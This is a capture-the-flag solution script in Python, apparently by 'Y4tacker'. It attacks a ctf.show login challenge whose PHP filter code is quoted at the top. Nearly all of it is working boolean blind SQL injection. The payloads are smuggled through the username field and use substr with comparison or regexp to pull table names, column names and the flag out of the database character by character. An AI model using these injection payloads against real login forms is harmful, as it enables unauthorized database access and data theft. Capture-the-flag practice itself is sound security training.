'''
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

    if(preg_match('/file|into|ascii|ord|hex/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }

'''

import requests

# url = 'http://f0cbd6db-9dfc-4ffa-a129-8060700fe9ec.chall.ctf.show:8080/api/index.php'
#
# flag = ''
# for i in range(1, 100):
#     length = len(flag)
#     min = 32
#     max = 128
#     while 1:
#         j = min + (max - min) // 2
#         if min == j:
#             flag += chr(j)
#             print(f'次数{i}, ascii {j}')
#             print(flag.lower())
#             if chr(j) == " ":
#                 exit()
#             break
#
#         payload = "' or if(substr((select group_concat(f1ag) from ctfshow_fl0g),{},1)<'{}',1,0)-- -".format(i, chr(j))
#
#         data = {
#             'username': payload,
#             'password': 1
#         }
#         r = requests.post(url=url, data=data).text
#         # print(r)
#         if r"\u5bc6\u7801\u9519\u8bef" in r:
#             max = j
#         else:
#             min = j

# @Author:Y4tacker

import string

url = "http://f0cbd6db-9dfc-4ffa-a129-8060700fe9ec.chall.ctf.show:8080/api/index.php"
flagstr = " _{}-" + string.ascii_lowercase + string.digits
flag = ''
for i in range(1, 51):
    for j in flagstr:
        # 查数据库
        # payload1 = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 查字段
        # payload1 = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"
        # 查flag
        payload1 = "select group_concat(f1ag) from ctfshow_fl0g"

        payload2 = f"admin' and if(substr(({payload1}),{i},1)regexp('{j}'),1,2)='1"
        data = {
            'username': payload2,
            'password': '1'
        }
        print(f'i={i}, j={j}')
        # print(data['username'])
        r = requests.post(url, data=data)
        if "密码错误" == r.json()['msg']:
            flag += j
            print(flag)
            if "}" == j:
                exit(0)
            break
